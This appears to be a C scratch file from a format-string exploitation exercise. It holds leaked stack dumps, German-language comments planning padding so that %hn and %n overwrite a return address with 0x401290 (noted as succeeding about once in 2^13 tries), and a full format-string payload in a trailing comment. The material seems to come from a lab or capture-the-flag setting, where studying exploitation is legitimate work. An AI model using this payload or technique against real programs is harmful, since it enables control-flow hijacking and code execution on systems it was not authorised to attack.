#include <stdio.h>
#include <stdlib.h>

int main() {
	char* str = "d5361680       0       0      204454df2025783825x8%%%%%%%%n8%x8%x8%x8�44434d0ad5363af9  4010a0444348e9       0a5341674  4011a0       0       0       0f1d4167419321674       0       0       0       1d5363998d53639a844625180       0       0  4011a0d5363990       0       0  4011cad5363988      1c       1";
	char* str2 = "859a7280       0       0      20a2065f2025783825x8%%%%%%%%l%x8%x8%x8%----------  4012c0a1f4cd0a859a96f9  4010a0a1f4c8e9       03b0d49f9  4011a0       0       0       037ed49f9870b49f9       0       0       0       1859a9598859a95a8a213d180       0       0  4011a0859a9590       0       0  4011ca859a9588      1c       1";
	char* str3 = "       0       0      20a2065f2025783825x8%%%%%%%%l%x8%x8%x8%----------  4012c0a1f4cd0a859a96f9  4010a0a1f4c8e9       03b0d49f9  4011a0       0       0       037ed49f9870b49f9       0       0       0       1859a9598859a95a8a213d180       0       0  4011a0859a9590       0       0  4011ca859a9588      1c       1";
	char* str4 = "       0       0      207fa35f2025783825x8%%%%%%%%l%x8%x8%x8%----------  4012c07f91cd0a604f3799  4010a07f91c8e9       05947dfcd  4011a0       0       0       01667dfcde541dfcd       0       0       0       1604f3638604f36487fb0d180       0       0  4011a0604f3630       0       0  4011ca604f3628      1c       1";	
	//len = 311
	char* str5 = "       0       0      207fa35f2025783825x8%%%%%%%%l%x8%x8%x8%----------  4012c07f91cd0a";
	//len = 0x57 = 87
	
	int i=0;
	int j=0;
   
	//0x401290 - 311 = 4198745 = 0x401159
	printf("%s%n\n" , str5, &i);	
	//printf("%4198745.4198745s%s%n\n", str2, str3, &j);	
	//=> right address
	printf("LEN: %d\n", i);
	printf("HERE: 0x%x\n", j);

	//plen1 (printed len bis %hn) = 0x57
	//wähle random zahl num mit num mod 0xFFF8 = 0
	//berechne num2 = num+plen1+1  (+1, damit num2 = 0 mod 0x8)
	//nutze %[num2].[num2]s um Zeichen zu schreiben, sodass n für %hn passend gesetzt, um zwei niederwertige bytes in stack addr zu überschreiben
	//plen2 ist länge der printed characters nach %hn und vor %[num3].[num3]s
	//plen2 ist 311 - 87 - 8
	//berechne num3 = 0x401290 - (num2 + plen2)
	//nutze %[num3].[num3]s um zu schreiben bis insgesamt 0x401290 Zeichen geschrieben //WICHTIG: muss an stelle stehen an der Speicheradresse steht die accessible ist
	
	// => Alle 2^13 Versuche über return adresse geschrieben
}


// %4198737.4198737s%8x%8x%8x%8x%8x%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%8x%8x%lln%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%p------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
